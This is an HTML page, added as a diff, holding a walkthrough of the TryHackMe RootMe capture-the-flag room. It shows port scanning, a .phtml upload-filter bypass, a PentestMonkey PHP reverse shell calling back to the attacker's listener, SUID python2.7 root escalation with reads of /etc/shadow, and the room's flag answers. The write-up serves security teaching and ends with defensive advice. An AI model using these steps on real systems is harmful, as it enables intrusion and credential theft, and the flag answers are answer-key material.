@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>RootMe Walkthrough</title>
+  <link rel="stylesheet" href="../assets/style.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <meta name="description" content="Complete walkthrough of the TryHackMe RootMe room featuring web application exploitation, file upload bypass, reverse shell deployment, and SUID privilege escalation.">
+  <meta name="keywords" content="rootme, tryhackme, file upload, reverse shell, SUID, python privilege escalation, web exploitation, CTF">
+  <meta name="author" content="Justin Van Den Hurk">
+</head>
+<body>
+  <div class="container">
+    <header>
+      <a href="../" class="back-link">Back to Writeups</a>
+      
+      <h1>RootMe Walkthrough</h1>
+      <p class="subtitle">Web Exploitation & Privilege Escalation</p>
+      
+      <div class="challenge-info">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
+          <span class="text-muted">Published: September 28, 2025</span>
+          <span class="text-muted">Difficulty: Easy</span>
+        </div>
+        <p>RootMe is a beginner-friendly challenge on <a href="https://tryhackme.com/room/rrootme" target="_blank" rel="noopener noreferrer">TryHackMe</a> that focuses on web application exploitation through file upload vulnerabilities and privilege escalation using SUID binaries. Learn to bypass file upload restrictions and exploit Python SUID permissions.</p>
+      </div>
+    </header>
+
+    <nav id="pre-security-nav">
+      <ul class="section-nav">
+        <li><a href="#reconnaissance">Reconnaissance</a></li>
+        <li><a href="#file-upload-bypass">File Upload Bypass</a></li>
+        <li><a href="#reverse-shell">Reverse Shell</a></li>
+        <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+      </ul>
+    </nav>
+
+    <main>
+      <article>
+        <section id="reconnaissance">
+          <h2>Reconnaissance Phase</h2>
+          
+          <div class="level-solution">
+            <h3>Network Scanning</h3>
+            <p><strong>Objective:</strong> Discover open ports and running services on the target machine.</p>
+            
+            <p>Start with a service version scan using Nmap:</p>
+            <pre><code>sudo nmap -sV &lt;TARGET_IP&gt;</code></pre>
+            
+            <p>For comprehensive scanning, use:</p>
+            <pre><code>sudo nmap -sC -sV -oN detailed_scan.txt &lt;TARGET_IP&gt;</code></pre>
+            
+            <p>The scan reveals the following open ports:</p>
+            <ul>
+              <li><strong>Port 22 (SSH):</strong> OpenSSH 8.2p1 Ubuntu 4ubuntu0.13</li>
+              <li><strong>Port 80 (HTTP):</strong> Apache httpd 2.4.41 (Ubuntu)</li>
+            </ul>
+            
+            <p><strong>Initial Questions Answered:</strong></p>
+            <div class="flag-container">
+              <strong>🚩 Number of ports scanned: 2</strong><br>
+              <strong>🚩 Apache version: 2.4.41</strong><br>
+              <strong>🚩 Service on port 22: ssh</strong>
+            </div>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Limited attack surface with only SSH and HTTP services. The web application becomes the primary target for initial access since SSH typically requires credentials.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>Web Directory Enumeration</h3>
+            <p><strong>Objective:</strong> Discover hidden directories and potential upload functionality.</p>
+            
+            <p>Use Gobuster to enumerate web directories:</p>
+            <pre><code>gobuster dir -u http://&lt;TARGET_IP&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre>
+            
+            <p>Alternative with additional extensions:</p>
+            <pre><code>gobuster dir -u http://&lt;TARGET_IP&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt</code></pre>
+            
+            <p>Key directories discovered:</p>
+            <ul>
+              <li><code>/uploads/</code> - File upload storage directory</li>
+              <li><code>/css/</code> - Stylesheet resources</li>
+              <li><code>/js/</code> - JavaScript resources</li>
+              <li><code>/panel/</code> - Admin/upload panel</li>
+            </ul>
+            
+            <div class="flag-container">
+              <strong>🚩 Directory for file uploads: /panel/</strong>
+            </div>
+            
+            <p><strong>Directory Analysis:</strong></p>
+            <p>Navigate to <code>http://&lt;TARGET_IP&gt;/panel/</code> to find a file upload interface. The presence of both <code>/panel/</code> and <code>/uploads/</code> suggests a file upload vulnerability.</p>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>File upload functionality combined with an uploads directory indicates potential for code execution via malicious file uploads. Always test upload restrictions and file execution capabilities.</p>
+          </div>
+        </section>
+
+        <section id="file-upload-bypass">
+          <h2>File Upload Vulnerability Exploitation</h2>
+          
+          <div class="level-solution">
+            <h3>Upload Restriction Analysis</h3>
+            <p><strong>Objective:</strong> Identify and bypass file upload restrictions to enable code execution.</p>
+            
+            <p>Navigate to the upload panel at <code>http://&lt;TARGET_IP&gt;/panel/</code> and test various file extensions:</p>
+            
+            <p><strong>Initial Testing:</strong></p>
+            <p>Try uploading a simple PHP file with <code>.php</code> extension - this will likely be blocked.</p>
+            
+            <p><strong>Extension Bypass Techniques:</strong></p>
+            <p>Common PHP extension bypasses to test:</p>
+            <ul>
+              <li><code>.phtml</code> - Alternative PHP extension</li>
+              <li><code>.php3</code> - Legacy PHP extension</li>
+              <li><code>.php4</code> - Legacy PHP extension</li>
+              <li><code>.php5</code> - Legacy PHP extension</li>
+              <li><code>.phps</code> - PHP source code</li>
+              <li><code>.phar</code> - PHP Archive</li>
+            </ul>
+            
+            <p>Based on the challenge notes, <code>.phtml</code> extension bypasses the restriction while <code>.php</code> is blocked.</p>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>File upload filters often use blacklists that can be bypassed with alternative extensions. Web servers may execute multiple PHP-related extensions, making extension-based filtering insufficient.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>Reverse Shell Preparation</h3>
+            <p><strong>Objective:</strong> Prepare a PHP reverse shell payload for upload and execution.</p>
+            
+            <p>Download the popular PentestMonkey PHP reverse shell:</p>
+            <pre><code>wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</code></pre>
+            
+            <p>Alternatively, create your own reverse shell:</p>
+            <pre><code>curl -O https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</code></pre>
+            
+            <p><strong>Shell Configuration:</strong></p>
+            <p>Edit the reverse shell file to configure your settings:</p>
+            <pre><code>nano php-reverse-shell.php</code></pre>
+            
+            <p>Modify the following lines:</p>
+            <ul>
+              <li><strong>IP Address:</strong> Change to your attacking machine's IP</li>
+              <li><strong>Port:</strong> Change to desired listening port (e.g., 4444)</li>
+            </ul>
+            
+            <pre><code>$ip = 'YOUR_IP_ADDRESS';  // Change this
+$port = 4444;             // Change this</code></pre>
+            
+            <p><strong>File Extension Modification:</strong></p>
+            <p>Rename the file to use the .phtml extension:</p>
+            <pre><code>mv php-reverse-shell.php reverse-shell.phtml</code></pre>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Reverse shells require proper configuration of IP addresses and ports. Using alternative extensions helps bypass basic upload filters while maintaining code execution capabilities.</p>
+          </div>
+        </section>
+
+        <section id="reverse-shell">
+          <h2>Reverse Shell Execution</h2>
+          
+          <div class="level-solution">
+            <h3>Netcat Listener Setup</h3>
+            <p><strong>Objective:</strong> Prepare to receive the reverse shell connection.</p>
+            
+            <p>Set up a Netcat listener on your attacking machine:</p>
+            <pre><code>nc -lvnp 4444</code></pre>
+            
+            <p>Explanation of flags:</p>
+            <ul>
+              <li><code>-l</code>: Listen mode</li>
+              <li><code>-v</code>: Verbose output</li>
+              <li><code>-n</code>: Don't resolve hostnames</li>
+              <li><code>-p 4444</code>: Listen on port 4444</li>
+            </ul>
+            
+            <p><strong>Alternative Listeners:</strong></p>
+            <p>You can also use other listening tools:</p>
+            <pre><code># Using ncat (Nmap's netcat)
+ncat -nlvp 4444
+
+# Using socat
+socat file:`tty`,raw,echo=0 tcp-listen:4444</code></pre>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Always set up your listener before triggering the reverse shell to avoid missing the connection. Netcat is the most commonly used tool for this purpose.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>File Upload and Execution</h3>
+            <p><strong>Objective:</strong> Upload the reverse shell and trigger code execution.</p>
+            
+            <p><strong>Upload Process:</strong></p>
+            <ol>
+              <li>Navigate to <code>http://&lt;TARGET_IP&gt;/panel/</code></li>
+              <li>Select your <code>reverse-shell.phtml</code> file</li>
+              <li>Upload the file successfully</li>
+            </ol>
+            
+            <p><strong>Shell Execution:</strong></p>
+            <p>Navigate to the uploaded file to trigger execution:</p>
+            <pre><code>http://&lt;TARGET_IP&gt;/uploads/reverse-shell.phtml</code></pre>
+            
+            <p>Check your Netcat listener for the incoming connection. You should receive a shell as the web server user (typically <code>www-data</code>).</p>
+            
+            <p><strong>Shell Stabilization:</strong></p>
+            <p>Upgrade to a more stable shell:</p>
+            <pre><code># Python method
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Alternative if python3 not available
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+# Export shell variables
+export TERM=xterm
+
+# Background process and set raw terminal
+# Press Ctrl+Z, then:
+stty raw -echo; fg</code></pre>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>File execution occurs when the web server processes the uploaded file. Shell stabilization improves usability and prevents accidental disconnections.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>Initial System Reconnaissance</h3>
+            <p><strong>Objective:</strong> Gather system information and locate the user flag.</p>
+            
+            <p>Basic system enumeration:</p>
+            <pre><code># Check current user and privileges
+whoami
+id
+
+# System information
+uname -a
+cat /etc/os-release
+
+# Network configuration
+ip addr
+ifconfig</code></pre>
+            
+            <p><strong>User Flag Discovery:</strong></p>
+            <p>Search for the user flag:</p>
+            <pre><code>find / -name "user.txt" -print 2>/dev/null</code></pre>
+            
+            <p>Result: <code>/var/www/user.txt</code></p>
+            
+            <p>Read the user flag:</p>
+            <pre><code>cat /var/www/user.txt</code></pre>
+            
+            <div class="flag-container">
+              <strong>🚩 User Flag: THM{y0u_g0t_a_sh3ll}</strong>
+            </div>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Initial access often provides limited privileges. System enumeration helps identify escalation paths and locate important files like flags.</p>
+          </div>
+        </section>
+
+        <section id="privilege-escalation">
+          <h2>Privilege Escalation to Root</h2>
+          
+          <div class="level-solution">
+            <h3>SUID Binary Enumeration</h3>
+            <p><strong>Objective:</strong> Identify SUID binaries that can be exploited for privilege escalation.</p>
+            
+            <p>Search for SUID binaries across the system:</p>
+            <pre><code>find / -perm -4000 2>/dev/null</code></pre>
+            
+            <p>Results include standard binaries and a notable finding:</p>
+            <ul>
+              <li>/usr/lib/dbus-1.0/dbus-daemon-launch-helper</li>
+              <li>/usr/lib/snapd/snap-confine</li>
+              <li>/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</li>
+              <li>/usr/lib/eject/dmcrypt-get-device</li>
+              <li>/usr/lib/openssh/ssh-keysign</li>
+              <li>/usr/lib/policykit-1/polkit-agent-helper-1</li>
+              <li>/usr/bin/newuidmap</li>
+              <li>/usr/bin/newgidmap</li>
+              <li>/usr/bin/chsh</li>
+              <li><strong>/usr/bin/python2.7</strong> ← Key finding</li>
+              <li>/usr/bin/at</li>
+              <li>/usr/bin/chfn</li>
+              <li>/usr/bin/gpasswd</li>
+              <li>/usr/bin/sudo</li>
+              <li>/usr/bin/newgrp</li>
+              <li>/usr/bin/passwd</li>
+              <li>/usr/bin/pkexec</li>
+            </ul>
+            
+            <p>The critical finding is <code>/usr/bin/python2.7</code> with SUID permissions, which is highly unusual and exploitable.</p>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>SUID binaries run with the permissions of their owner (often root). Python with SUID permissions is extremely dangerous as it allows arbitrary code execution with elevated privileges.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>Python SUID Exploitation</h3>
+            <p><strong>Objective:</strong> Exploit the Python SUID binary to gain root access and retrieve the final flag.</p>
+            
+            <p><strong>GTFOBins Research:</strong></p>
+            <p>Consult <a href="https://gtfobins.github.io/gtfobins/python/" target="_blank" rel="noopener noreferrer">GTFOBins</a> for Python privilege escalation techniques.</p>
+            
+            <p><strong>Direct File Access Method:</strong></p>
+            <p>Use Python to directly read the root flag:</p>
+            <pre><code>python2.7 -c 'print(open("/root/root.txt").read())'</code></pre>
+            
+            <div class="flag-container">
+              <strong>🚩 Root Flag: THM{pr1v1l3g3_3sc4l4t10n}</strong>
+            </div>
+            
+            <p><strong>Alternative Exploitation Methods:</strong></p>
+            
+            <p>Spawn a root shell:</p>
+            <pre><code># Method 1: Direct shell spawn
+python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+# Method 2: System command execution
+python2.7 -c 'import os; os.system("/bin/bash -p")'
+
+# Method 3: Using subprocess
+python2.7 -c 'import subprocess; subprocess.call(["/bin/bash", "-p"])'</code></pre>
+            
+            <p><strong>Root Shell Verification:</strong></p>
+            <p>Once you have a root shell, verify your privileges:</p>
+            <pre><code>whoami
+id
+cat /etc/shadow</code></pre>
+            
+            <p><strong>Additional Root Activities:</strong></p>
+            <p>With root access, you can:</p>
+            <ul>
+              <li>Read all system files: <code>cat /etc/shadow</code></li>
+              <li>Access all user directories: <code>ls -la /root/</code></li>
+              <li>View system logs: <code>tail -f /var/log/auth.log</code></li>
+              <li>Install persistence mechanisms</li>
+            </ul>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>SUID Python is one of the most dangerous misconfigurations as it provides immediate root access through various methods. GTFOBins is an excellent resource for exploitation techniques.</p>
+          </div>
+        </section>
+
+        <section id="summary">
+          <h2>Challenge Summary</h2>
+          
+          <div class="level-solution">
+            <h3>Complete Attack Chain</h3>
+            <p><strong>Full Exploitation Path:</strong></p>
+            
+            <ol>
+              <li><strong>Reconnaissance:</strong> Nmap scan revealed web application on Apache</li>
+              <li><strong>Directory Enumeration:</strong> Discovered upload panel and storage directory</li>
+              <li><strong>Upload Restriction Bypass:</strong> Used .phtml extension to bypass .php filter</li>
+              <li><strong>Code Execution:</strong> Uploaded PHP reverse shell for initial access</li>
+              <li><strong>System Enumeration:</strong> Located user flag and identified SUID binaries</li>
+              <li><strong>Privilege Escalation:</strong> Exploited Python SUID for root access</li>
+            </ol>
+            
+            <p><strong>Flags Captured:</strong></p>
+            <div class="flag-container">
+              <strong>Reconnaissance Answers:</strong><br>
+              • Number of open ports: 2<br>
+              • Apache version: 2.4.41<br>
+              • Service on port 22: ssh<br>
+              • Upload directory: /panel/<br><br>
+              <strong>🚩 User Flag: THM{y0u_g0t_a_sh3ll}</strong><br>
+              <strong>🚩 Root Flag: THM{pr1v1l3g3_3sc4l4t10n}</strong>
+            </div>
+            
+            <p><strong>Technical Skills Demonstrated:</strong></p>
+            <ul>
+              <li>Network reconnaissance and service enumeration</li>
+              <li>Web directory enumeration and discovery</li>
+              <li>File upload vulnerability identification and exploitation</li>
+              <li>Extension-based filter bypass techniques</li>
+              <li>PHP reverse shell deployment and configuration</li>
+              <li>Shell stabilization and upgrade techniques</li>
+              <li>SUID binary enumeration and exploitation</li>
+              <li>Python privilege escalation techniques</li>
+            </ul>
+            
+            <p><strong>Tools and Techniques Used:</strong></p>
+            <ul>
+              <li><strong>Nmap:</strong> Network scanning and service detection</li>
+              <li><strong>Gobuster:</strong> Web directory and file enumeration</li>
+              <li><strong>PHP Reverse Shell:</strong> Remote code execution payload</li>
+              <li><strong>Netcat:</strong> Reverse shell listener and network utility</li>
+              <li><strong>Find:</strong> File and SUID binary discovery</li>
+              <li><strong>Python:</strong> SUID privilege escalation and file access</li>
+              <li><strong>GTFOBins:</strong> Exploitation technique reference</li>
+            </ul>
+            
+            <p><strong>Vulnerabilities Identified:</strong></p>
+            <ul>
+              <li><strong>Insecure File Upload:</strong> Insufficient extension filtering</li>
+              <li><strong>Code Execution:</strong> Server executes uploaded PHP files</li>
+              <li><strong>SUID Misconfiguration:</strong> Python interpreter with elevated privileges</li>
+              <li><strong>Directory Listing:</strong> Upload directory accessible</li>
+              <li><strong>Weak Input Validation:</strong> Extension-based filtering only</li>
+            </ul>
+            
+            <p><strong>Defensive Recommendations:</strong></p>
+            <ul>
+              <li><strong>File Upload Security:</strong> Implement content-based validation, not just extension checking</li>
+              <li><strong>Execution Prevention:</strong> Store uploads outside web root or disable execution</li>
+              <li><strong>SUID Auditing:</strong> Regular review and removal of unnecessary SUID binaries</li>
+              <li><strong>Web Server Configuration:</strong> Disable execution of uploaded files</li>
+              <li><strong>Input Validation:</strong> Use whitelist approach instead of blacklist</li>
+              <li><strong>Principle of Least Privilege:</strong> Run services with minimal required permissions</li>
+              <li><strong>Security Headers:</strong> Implement appropriate HTTP security headers</li>
+            </ul>
+            
+            <p><strong>Real-World Implications:</strong></p>
+            <p>This challenge demonstrates common vulnerabilities in web applications:</p>
+            <ul>
+              <li>File upload vulnerabilities are frequently found in content management systems</li>
+              <li>SUID misconfigurations are critical system administration errors</li>
+              <li>Extension-based filtering is insufficient for security</li>
+              <li>Default configurations often lack proper security controls</li>
+              <li>Layered security approaches are necessary for effective protection</li>
+            </ul>
+          </div>
+        </section>
+      </article>
+      
+    </main>
+
+    <footer>
+      <p>
+        Created by <a href="https://www.linkedin.com/in/justin-tom-van-den-hurk/" target="_blank" rel="noopener noreferrer">Justin Van Den Hurk</a>
+        • 
+        <a href="https://github.com/jvandenhurk" target="_blank" rel="noopener noreferrer">View on GitHub</a>
+      </p>
+      <p class="text-muted">Last updated: September 2025</p>
+      <a class="backtotop" href="#">Back to top</a>
+    </footer>
+  </div>
+</body>
+</html>
